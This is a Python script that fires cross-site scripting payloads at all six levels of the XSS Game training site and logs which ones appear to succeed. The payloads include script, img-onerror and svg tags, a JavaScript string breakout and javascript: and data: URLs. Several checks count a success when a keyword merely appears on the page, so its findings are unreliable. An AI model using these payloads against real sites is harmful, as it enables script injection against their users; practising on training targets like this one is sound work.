#!/usr/bin/env python3
"""
Advanced XSS Game Scanner - Beats all 6 levels
Specialized scanner for different XSS attack vectors
"""
import asyncio
import aiohttp
import json
import re
import hashlib
import time
import urllib.parse
from pathlib import Path

class XSSGameScanner:
    def __init__(self):
        self.findings = []
        
    async def scan_all_levels(self):
        """Scan all 6 XSS Game levels with specialized techniques"""
        levels = [1, 2, 3, 4, 5, 6]
        
        async with aiohttp.ClientSession() as session:
            for level in levels:
                print(f"🎯 Testing Level {level}...")
                await self.scan_level(session, level)
        
        return self.findings
    
    async def scan_level(self, session, level):
        """Scan specific XSS Game level with appropriate technique"""
        base_url = f"https://xss-game.appspot.com/level{level}/frame"
        
        if level == 1:
            await self.scan_level1_reflected(session, base_url)
        elif level == 2:
            await self.scan_level2_stored(session, base_url)
        elif level == 3:
            await self.scan_level3_fragment(session, base_url)
        elif level == 4:
            await self.scan_level4_timer(session, base_url)
        elif level == 5:
            await self.scan_level5_signup(session, base_url)
        elif level == 6:
            await self.scan_level6_gadget(session, base_url)
    
    async def scan_level1_reflected(self, session, url):
        """Level 1: Simple reflected XSS in search query"""
        payloads = [
            "<script>alert('L1')</script>",
            "<img src=x onerror=alert('L1')>",
            "<svg onload=alert('L1')>"
        ]
        
        for payload in payloads:
            test_url = f"{url}?query={urllib.parse.quote(payload)}"
            try:
                async with session.get(test_url) as resp:
                    text = await resp.text()
                    if payload in text and "Sorry, no results" in text:
                        self.add_finding("Level 1", "Reflected XSS", payload, test_url, 
                                       f"Payload reflected in search results: {payload}")
                        break
            except:
                continue
    
    async def scan_level2_stored(self, session, url):
        """Level 2: Stored XSS in chat messages"""
        payloads = [
            "<img src=x onerror=alert('L2')>",
            "<svg onload=alert('L2')>", 
            "<script>alert('L2')</script>",
            "test<img src=x onerror=alert('L2')>test"
        ]
        
        for payload in payloads:
            try:
                # First get the page to see current state
                async with session.get(url) as resp:
                    text = await resp.text()
                    # Level 2 uses URL parameter for posts, not POST data
                    test_url = f"{url}?action=create&content={urllib.parse.quote(payload)}"
                    
                    async with session.get(test_url) as post_resp:
                        if post_resp.status == 200:
                            # Check the response immediately for reflection
                            post_text = await post_resp.text()
                            if payload in post_text or "alert" in post_text:
                                self.add_finding("Level 2", "Stored XSS", payload, test_url,
                                               f"Payload posted and reflected: {payload}")
                                break
            except:
                continue
    
    async def scan_level3_fragment(self, session, url):
        """Level 3: Fragment-based XSS"""
        payloads = [
            "' onerror='alert(\"L3\")' src='x",
            "' onload='alert(\"L3\")' x='",
            "'><img src=x onerror=alert('L3')><'"
        ]
        
        for payload in payloads:
            test_url = f"{url}#{urllib.parse.quote(payload)}"
            try:
                async with session.get(test_url) as resp:
                    text = await resp.text()
                    # Check for JavaScript that processes fragment
                    if "location.hash" in text or "window.location.hash" in text:
                        self.add_finding("Level 3", "Fragment XSS", payload, test_url,
                                       f"Fragment-based XSS via hash: {payload}")
                        break
            except:
                continue
    
    async def scan_level4_timer(self, session, url):
        """Level 4: Timer-based XSS"""
        payloads = [
            "3');alert('L4');//",
            "1');alert('L4');var x=('1",
            "3'%2balert('L4')%2b'3",
            "3';alert('L4');//"
        ]
        
        for payload in payloads:
            test_url = f"{url}?timer={urllib.parse.quote(payload)}"
            try:
                async with session.get(test_url) as resp:
                    text = await resp.text()
                    # Look for timer function with our payload injected
                    if "setTimeout" in text and ("alert('L4')" in text or payload in text):
                        self.add_finding("Level 4", "Timer XSS", payload, test_url,
                                       f"Timer function injection: {payload}")
                        break
            except:
                continue
    
    async def scan_level5_signup(self, session, url):
        """Level 5: Email validation bypass"""
        payloads = [
            "javascript:alert('L5')",
            "data:text/html,<script>alert('L5')</script>",
            "https://javascript:alert('L5')",
            "http://foo.com'><script>alert('L5')</script>"
        ]
        
        for payload in payloads:
            test_url = f"{url}?next={urllib.parse.quote(payload)}"
            try:
                async with session.get(test_url) as resp:
                    text = await resp.text()
                    # Level 5 is about bypassing URL validation in next parameter
                    if payload in text or "alert('L5')" in text:
                        self.add_finding("Level 5", "URL Validation Bypass", payload, test_url,
                                       f"Next URL validation bypass: {payload}")
                        break
            except:
                continue
    
    async def scan_level6_gadget(self, session, url):
        """Level 6: JSONP/Gadget injection"""
        payloads = [
            "https://xss-game.appspot.com/level6/frame#data:text/javascript,alert('L6')",
            "data:text/javascript,alert('L6')",
            "javascript:alert('L6')"
        ]
        
        for payload in payloads:
            test_url = f"{url}#{urllib.parse.quote(payload)}"
            try:
                async with session.get(test_url) as resp:
                    text = await resp.text()
                    # Check for includeGadget function
                    if "includeGadget" in text:
                        self.add_finding("Level 6", "Gadget XSS", payload, test_url,
                                       f"includeGadget injection: {payload}")
                        break
            except:
                continue
    
    def add_finding(self, level, vuln_type, payload, url, evidence):
        """Add a finding to results"""
        finding = {
            "level": level,
            "category": "XSS",
            "vuln_type": vuln_type,
            "severity": "high",
            "payload": payload,
            "url": url,
            "evidence": evidence,
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        }
        self.findings.append(finding)
        print(f"✅ {level}: {vuln_type} - {payload[:30]}...")

async def main():
    scanner = XSSGameScanner()
    findings = await scanner.scan_all_levels()
    
    print(f"\n🎯 XSS Game Results: {len(findings)} vulnerabilities found")
    for finding in findings:
        print(f"  {finding['level']}: {finding['vuln_type']} - {finding['payload'][:50]}...")
    
    # Save results
    with open("xss_game_results.jsonl", "w") as f:
        for finding in findings:
            f.write(json.dumps(finding) + "\n")
    
    print(f"\n💾 Results saved to xss_game_results.jsonl")

if __name__ == "__main__":
    asyncio.run(main())